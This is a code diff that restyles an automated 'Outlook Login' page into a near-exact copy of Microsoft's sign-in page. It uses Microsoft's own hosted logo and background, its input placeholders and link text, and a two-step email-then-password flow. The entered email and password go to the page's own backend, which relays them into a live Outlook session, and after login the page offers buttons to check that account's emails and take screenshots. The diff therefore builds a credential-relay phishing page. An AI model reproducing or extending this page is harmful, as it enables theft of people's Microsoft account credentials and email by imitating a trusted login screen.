@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -13,7 +14,9 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
+            background-size: cover;
+            background-position: center;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -23,11 +26,11 @@
 
         .container {
             background: white;
-            padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            border-radius: 0;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
             width: 100%;
-            max-width: 500px;
+            max-width: 440px;
             animation: fadeIn 0.5s ease-out;
         }
 
@@ -42,131 +45,158 @@
             }
         }
 
+        .microsoft-logo {
+            width: 108px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+
         .header {
-            text-align: center;
-            margin-bottom: 2rem;
+            margin-bottom: 20px;
         }
 
         .header h1 {
-            color: #333;
-            font-size: 1.8rem;
-            margin-bottom: 0.5rem;
+            color: #1b1b1b;
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0;
         }
 
-        .header p {
-            color: #666;
-            font-size: 0.9rem;
+        .back-info {
+            margin: 10px 0;
+            font-size: 13px;
+            color: #323130;
+            display: none;
+        }
+
+        .back-info.visible {
+            display: block;
         }
 
         .status {
             background: #f8f9ff;
-            padding: 1rem;
-            border-radius: 5px;
-            margin-bottom: 1.5rem;
-            border-left: 4px solid #667eea;
+            padding: 15px;
+            border-radius: 2px;
+            margin-bottom: 20px;
+            border-left: 4px solid #0078d4;
+            font-size: 13px;
         }
 
         .status-indicator {
             display: inline-block;
-            width: 10px;
-            height: 10px;
+            width: 8px;
+            height: 8px;
             border-radius: 50%;
-            margin-right: 10px;
+            margin-right: 8px;
         }
 
         .status-indicator.online {
-            background: #28a745;
+            background: #107c10;
         }
 
         .status-indicator.offline {
-            background: #dc3545;
+            background: #d13438;
         }
 
         .form-group {
-            margin-bottom: 1.5rem;
+            margin-bottom: 15px;
         }
 
-        label {
-            display: block;
-            margin-bottom: 0.5rem;
-            color: #333;
-            font-weight: 500;
-        }
-
-        input[type="email"],
-        input[type="password"] {
+        .microsoft-input {
             width: 100%;
-            padding: 0.75rem;
-            border: 2px solid #ddd;
-            border-radius: 5px;
-            font-size: 1rem;
-            transition: border-color 0.3s ease;
+            padding: 6px 6px 6px 0;
+            border: none;
+            border-bottom: 1px solid #0067b8;
+            background-color: transparent;
+            outline: none;
+            font-size: 15px;
+            color: #323130;
         }
 
-        input[type="email"]:focus,
-        input[type="password"]:focus {
-            outline: none;
-            border-color: #667eea;
+        .microsoft-input:focus {
+            border-bottom: 2px solid #0078d4;
+        }
+
+        .microsoft-input::placeholder {
+            color: #605e5c;
+        }
+
+        .form-links {
+            margin: 15px 0;
+            font-size: 13px;
+        }
+
+        .form-links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .form-links a:hover {
+            text-decoration: underline;
+        }
+
+        .form-links .create-account {
+            color: #323130;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: flex-end;
+            gap: 4px;
+            margin-top: 20px;
         }
 
         .btn {
-            width: 100%;
-            padding: 0.75rem;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
+            padding: 6px 32px;
             border: none;
-            border-radius: 5px;
-            font-size: 1rem;
+            border-radius: 0;
             cursor: pointer;
-            transition: transform 0.2s ease;
-            margin-bottom: 10px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .btn-secondary {
+            background-color: #e1e1e1;
+            color: #323130;
+        }
+
+        .btn-primary {
+            background-color: #0078d4;
+            color: white;
         }
 
         .btn:hover:not(:disabled) {
-            transform: translateY(-2px);
+            opacity: 0.9;
         }
 
         .btn:disabled {
             opacity: 0.6;
             cursor: not-allowed;
-            transform: none;
-        }
-
-        .btn.secondary {
-            background: #6c757d;
-        }
-
-        .btn.danger {
-            background: #dc3545;
-        }
-
-        .btn.success {
-            background: #28a745;
         }
 
         .message {
-            padding: 1rem;
-            border-radius: 5px;
-            margin-bottom: 1rem;
-            font-size: 0.9rem;
+            padding: 12px;
+            border-radius: 2px;
+            margin-bottom: 15px;
+            font-size: 13px;
         }
 
         .message.success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
+            background: #dff6dd;
+            color: #107c10;
+            border: 1px solid #92c5f7;
         }
 
         .message.error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
+            background: #fde7e9;
+            color: #a4262c;
+            border: 1px solid #a4262c;
         }
 
         .message.info {
-            background: #cce7ff;
-            color: #004085;
-            border: 1px solid #b8daff;
+            background: #deecf9;
+            color: #323130;
+            border: 1px solid #92c5f7;
         }
 
         .loading {
@@ -176,10 +206,10 @@
         }
 
         .spinner {
-            width: 30px;
-            height: 30px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #0078d4;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto 10px;
@@ -190,110 +220,165 @@
             100% { transform: rotate(360deg); }
         }
 
+        .sign-in-options {
+            background: white;
+            padding: 20px 41px;
+            border-radius: 0;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 440px;
+            margin-top: 10px;
+            text-align: left;
+            font-size: 13px;
+            color: #323130;
+        }
+
         .session-info {
-            background: #e6f3ff;
-            padding: 1rem;
-            border-radius: 5px;
-            margin-bottom: 1rem;
-            font-size: 0.9rem;
+            background: #deecf9;
+            padding: 12px;
+            border-radius: 2px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            border: 1px solid #92c5f7;
         }
 
         .actions {
             display: none;
-            margin-top: 1rem;
+            margin-top: 20px;
         }
 
         .actions.visible {
             display: block;
         }
 
+        .actions .btn {
+            width: 100%;
+            margin-bottom: 8px;
+            padding: 8px 16px;
+            border-radius: 2px;
+            font-size: 13px;
+        }
+
+        .actions .btn.success {
+            background-color: #107c10;
+            color: white;
+        }
+
+        .actions .btn.danger {
+            background-color: #d13438;
+            color: white;
+        }
+
         .hidden {
             display: none;
+        }
+
+        .password-section {
+            display: none;
+        }
+
+        .password-section.visible {
+            display: block;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>📧 Outlook Login</h1>
-            <p>Automated browser login to Outlook</p>
-        </div>
-
-        <div class="status">
-            <span class="status-indicator" id="statusIndicator"></span>
-            <span id="statusText">Checking backend...</span>
-        </div>
-
-        <!-- Message area -->
-        <div id="messageArea"></div>
-
-        <!-- Loading indicator -->
-        <div class="loading" id="loadingIndicator">
-            <div class="spinner"></div>
-            <p id="loadingText">Processing email entry...</p>
-        </div>
-
-        <!-- Login form -->
-        <div id="loginForm">
-            <form id="emailForm" onsubmit="startLogin(event)">
-                <div class="form-group">
-                    <label for="email">Email Address</label>
-                    <input type="email" id="email" placeholder="your-email@outlook.com" required>
-                </div>
-
-                <div class="form-group">
-                    <label for="password">Password (optional)</label>
-                    <input type="password" id="password" placeholder="Leave empty - will ask when needed">
-                    <small style="color: #666; font-size: 0.8rem; display: block; margin-top: 5px;">
-                        Leave empty to let the system detect what the site needs first. Password will be requested when required.
-                    </small>
-                </div>
-
-                <button type="submit" class="btn" id="startBtn">
-                    🚀 Start Outlook Login
-                </button>
-            </form>
-        </div>
-
-        <!-- Session actions (shown after login starts) -->
-        <div class="actions" id="sessionActions">
-            <div class="session-info">
-                <strong>Session Active:</strong> <span id="sessionId">-</span>
+    <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
+        <div class="container">
+            <img class="microsoft-logo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+            
+            <div class="back-info" id="backInfo">
+                ← <span id="enteredEmail"></span>
             </div>
 
-            <div id="continuePasswordForm" class="hidden">
-                <div class="message info" style="margin-bottom: 1rem;">
-                    ✅ Account found! Please enter your password to continue.
-                </div>
-                <div class="form-group">
-                    <label for="continuePassword">Password</label>
-                    <input type="password" id="continuePassword" placeholder="Enter your password" required onkeypress="if(event.key==='Enter') continueLogin()">
-                </div>
-                <button type="button" class="btn" onclick="continueLogin()">
-                    🔐 Continue Login
-                </button>
+            <div class="header">
+                <h1 id="headerTitle">Sign in</h1>
             </div>
 
-            <button type="button" class="btn success" onclick="takeScreenshot()">
-                📸 Take Screenshot
-            </button>
-            
-            <button type="button" class="btn success" onclick="checkEmails()">
-                📬 Check Emails
-            </button>
-            
-            <button type="button" class="btn secondary" onclick="startNewSession()">
-                🔄 Start New Session
-            </button>
-            
-            <button type="button" class="btn danger" onclick="closeSession()">
-                ❌ Close Session
-            </button>
+            <div class="status">
+                <span class="status-indicator" id="statusIndicator"></span>
+                <span id="statusText">Checking backend...</span>
+            </div>
+
+            <!-- Message area -->
+            <div id="messageArea"></div>
+
+            <!-- Loading indicator -->
+            <div class="loading" id="loadingIndicator">
+                <div class="spinner"></div>
+                <p id="loadingText">Processing...</p>
+            </div>
+
+            <!-- Email form -->
+            <div id="emailForm">
+                <form onsubmit="startLogin(event)">
+                    <div class="form-group">
+                        <input type="email" id="email" class="microsoft-input" placeholder="Email, phone, or Skype" required>
+                    </div>
+
+                    <div class="form-links">
+                        <span class="create-account">No account? <a href="#" onclick="return false;">Create one!</a></span><br><br>
+                        <a href="#" onclick="return false;">Can't access your account?</a>
+                    </div>
+
+                    <div class="button-group">
+                        <button type="button" class="btn btn-secondary" onclick="goBack()">Back</button>
+                        <button type="submit" class="btn btn-primary" id="nextBtn">Next</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Password form -->
+            <div id="passwordForm" class="password-section">
+                <form onsubmit="continueLogin(event)">
+                    <div class="form-group">
+                        <input type="password" id="password" class="microsoft-input" placeholder="Password" required>
+                    </div>
+
+                    <div class="form-links">
+                        <a href="#" onclick="return false;">Forgot my password</a>
+                    </div>
+
+                    <div class="button-group">
+                        <button type="button" class="btn btn-secondary" onclick="goBackToEmail()">Back</button>
+                        <button type="submit" class="btn btn-primary" id="signInBtn">Sign in</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Session actions (shown after login starts) -->
+            <div class="actions" id="sessionActions">
+                <div class="session-info">
+                    <strong>Session Active:</strong> <span id="sessionId">-</span>
+                </div>
+
+                <button type="button" class="btn success" onclick="takeScreenshot()">
+                    📸 Take Screenshot
+                </button>
+                
+                <button type="button" class="btn success" onclick="checkEmails()">
+                    📬 Check Emails
+                </button>
+                
+                <button type="button" class="btn btn-secondary" onclick="startNewSession()">
+                    🔄 Start New Session
+                </button>
+                
+                <button type="button" class="btn danger" onclick="closeSession()">
+                    ❌ Close Session
+                </button>
+            </div>
+        </div>
+
+        <!-- Sign-in options -->
+        <div class="sign-in-options">
+            🔒 Sign-in options
         </div>
     </div>
 
     <script>
         let currentSessionId = null;
+        let currentStep = 'email'; // 'email' or 'password'
         const API_BASE = '';
 
         // Initialize
@@ -315,10 +400,33 @@
 
         function setLoading(loading) {
             document.getElementById('loadingIndicator').style.display = loading ? 'block' : 'none';
-            document.getElementById('loginForm').style.display = loading ? 'none' : 'block';
+            document.getElementById('emailForm').style.display = loading ? 'none' : (currentStep === 'email' ? 'block' : 'none');
+            document.getElementById('passwordForm').style.display = loading ? 'none' : (currentStep === 'password' ? 'block' : 'none');
             
             const buttons = document.querySelectorAll('.btn');
             buttons.forEach(btn => btn.disabled = loading);
+        }
+
+        function showPasswordForm(email) {
+            currentStep = 'password';
+            document.getElementById('emailForm').style.display = 'none';
+            document.getElementById('passwordForm').className = 'password-section visible';
+            document.getElementById('headerTitle').textContent = 'Enter password';
+            document.getElementById('backInfo').className = 'back-info visible';
+            document.getElementById('enteredEmail').textContent = email;
+            
+            // Focus on password field
+            setTimeout(() => {
+                document.getElementById('password').focus();
+            }, 100);
+        }
+
+        function showEmailForm() {
+            currentStep = 'email';
+            document.getElementById('emailForm').style.display = 'block';
+            document.getElementById('passwordForm').className = 'password-section';
+            document.getElementById('headerTitle').textContent = 'Sign in';
+            document.getElementById('backInfo').className = 'back-info';
         }
 
         function showSessionActions(show) {
@@ -326,9 +434,21 @@
             actions.className = show ? 'actions visible' : 'actions';
             
             if (!show) {
-                document.getElementById('loginForm').style.display = 'block';
-                document.getElementById('continuePasswordForm').className = 'hidden';
+                showEmailForm();
+            } else {
+                document.getElementById('emailForm').style.display = 'none';
+                document.getElementById('passwordForm').className = 'password-section';
             }
+        }
+
+        function goBack() {
+            // Placeholder for back functionality
+            return false;
+        }
+
+        function goBackToEmail() {
+            showEmailForm();
+            document.getElementById('password').value = '';
         }
 
         // API Functions
@@ -375,7 +495,6 @@
                             currentSessionId = data.sessionId;
                             document.getElementById('sessionId').textContent = currentSessionId;
                             showSessionActions(true);
-                            document.getElementById('loginForm').style.display = 'none';
                         }
                     }
                 } else {
@@ -397,7 +516,6 @@
                     currentSessionId = data.sessionId;
                     document.getElementById('sessionId').textContent = currentSessionId;
                     showSessionActions(true);
-                    document.getElementById('loginForm').style.display = 'none';
                     showMessage('Found existing session. You can take screenshots or start a new session.', 'info');
                 }
             } catch (error) {
@@ -409,7 +527,6 @@
             event.preventDefault();
             
             const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
 
             clearMessage();
             setLoading(true);
@@ -418,7 +535,7 @@
                 const response = await fetch(`${API_BASE}/api/login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password })
+                    body: JSON.stringify({ email, password: '' })
                 });
 
                 const data = await response.json();
@@ -430,6 +547,7 @@
                     if (data.loginComplete) {
                         if (data.loginSuccess) {
                             showMessage(`✅ ${data.message}`, 'success');
+                            showSessionActions(true);
                         } else {
                             showMessage(`⚠️ ${data.message}`, 'error');
                         }
@@ -437,55 +555,47 @@
                         // Show site report if available
                         if (data.siteReport) {
                             let reportHtml = `🔄 ${data.message}<br><br>`;
-                            reportHtml += '<strong>📋 Site Report:</strong><br>';
                             
-                            if (data.siteReport.accountExists) {
-                                reportHtml += '✅ Account exists<br>';
+                            if (data.siteReport.accountExists && data.siteReport.needsPassword) {
+                                reportHtml += '✅ Account found! Please enter your password.<br>';
+                                showPasswordForm(email);
+                            } else {
+                                reportHtml += '<strong>📋 Site Report:</strong><br>';
+                                
+                                if (data.siteReport.accountExists) {
+                                    reportHtml += '✅ Account exists<br>';
+                                }
+                                
+                                if (data.siteReport.needsPassword) {
+                                    reportHtml += '🔑 Password required<br>';
+                                    showPasswordForm(email);
+                                }
+                                
+                                if (data.siteReport.needsMFA) {
+                                    reportHtml += '📱 Multi-factor authentication required<br>';
+                                }
+                                
+                                if (data.siteReport.errorMessages.length > 0) {
+                                    reportHtml += '❌ Errors found:<br>';
+                                    data.siteReport.errorMessages.forEach(error => {
+                                        reportHtml += `• ${error}<br>`;
+                                    });
+                                }
+                                
+                                if (data.siteReport.siteResponse) {
+                                    reportHtml += `💬 Site Response: ${data.siteReport.siteResponse}<br>`;
+                                }
+                                
+                                reportHtml += `🌐 Current URL: ${data.siteReport.pageUrl || 'N/A'}<br>`;
+                                reportHtml += `📄 Page Title: ${data.siteReport.pageTitle || 'N/A'}`;
                             }
-                            
-                            if (data.siteReport.needsPassword) {
-                                reportHtml += '🔑 Password required<br>';
-                                document.getElementById('continuePasswordForm').className = '';
-                                // Focus on password field for better UX
-                                setTimeout(() => {
-                                    document.getElementById('continuePassword').focus();
-                                }, 100);
-                            }
-                            
-                            if (data.siteReport.needsMFA) {
-                                reportHtml += '📱 Multi-factor authentication required<br>';
-                            }
-                            
-                            if (data.siteReport.errorMessages.length > 0) {
-                                reportHtml += '❌ Errors found:<br>';
-                                data.siteReport.errorMessages.forEach(error => {
-                                    reportHtml += `• ${error}<br>`;
-                                });
-                            }
-                            
-                            if (data.siteReport.siteResponse) {
-                                reportHtml += `💬 Site Response: ${data.siteReport.siteResponse}<br>`;
-                            }
-                            
-                            reportHtml += `🌐 Current URL: ${data.siteReport.pageUrl || 'N/A'}<br>`;
-                            reportHtml += `📄 Page Title: ${data.siteReport.pageTitle || 'N/A'}`;
                             
                             showMessage(reportHtml, data.siteReport.errorMessages.length > 0 ? 'error' : 'info');
                         } else {
                             showMessage(`🔄 ${data.message}`, 'info');
-                            // Show continue password form if no password was provided
-                            if (!password) {
-                                document.getElementById('continuePasswordForm').className = '';
-                                // Focus on password field
-                                setTimeout(() => {
-                                    document.getElementById('continuePassword').focus();
-                                }, 100);
-                            }
+                            showPasswordForm(email);
                         }
                     }
-
-                    showSessionActions(true);
-                    document.getElementById('loginForm').style.display = 'none';
 
                 } else {
                     throw new Error(data.error || 'Login failed');
@@ -498,8 +608,10 @@
             }
         }
 
-        async function continueLogin() {
-            const password = document.getElementById('continuePassword').value;
+        async function continueLogin(event) {
+            event.preventDefault();
+            
+            const password = document.getElementById('password').value;
             
             if (!password) {
                 showMessage('Please enter your password', 'error');
@@ -521,13 +633,13 @@
                 if (response.ok) {
                     if (data.loginSuccess) {
                         showMessage(`✅ ${data.message}`, 'success');
+                        showSessionActions(true);
                     } else {
                         showMessage(`⚠️ ${data.message}`, 'error');
                     }
                     
-                    // Hide continue form
-                    document.getElementById('continuePasswordForm').className = 'hidden';
-                    document.getElementById('continuePassword').value = '';
+                    // Clear password field
+                    document.getElementById('password').value = '';
 
                 } else {
                     throw new Error(data.error || 'Continue login failed');
@@ -589,9 +701,10 @@
         async function startNewSession() {
             if (confirm('This will close the current session and start a new one. Continue?')) {
                 await closeSession();
-                // Reset form
+                // Reset forms
                 document.getElementById('email').value = '';
                 document.getElementById('password').value = '';
+                showEmailForm();
                 clearMessage();
             }
         }
